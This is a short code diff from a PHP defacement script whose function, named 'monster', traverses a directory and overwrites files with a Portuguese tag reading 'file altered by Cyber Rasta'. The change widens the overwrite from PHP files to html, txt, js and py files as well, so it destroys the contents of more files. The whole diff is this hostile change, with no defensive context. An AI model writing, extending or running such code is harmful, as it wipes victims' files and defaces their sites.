@@ -17,7 +17,7 @@ function monster($dir) {
             $newName .= " ($i)";
         }
 
-        if ($fileInfo->isFile() && $fileInfo->getExtension() === php) {
+        if ($fileInfo->isFile() && in_array($fileInfo->getExtension(), ['php', 'html', 'txt', 'js', 'py', 'txt'])) {
             file_put_contents($oldName, '<?php echo "Arquivo alterado por Cyber Rasta"; ?>');
         }
 
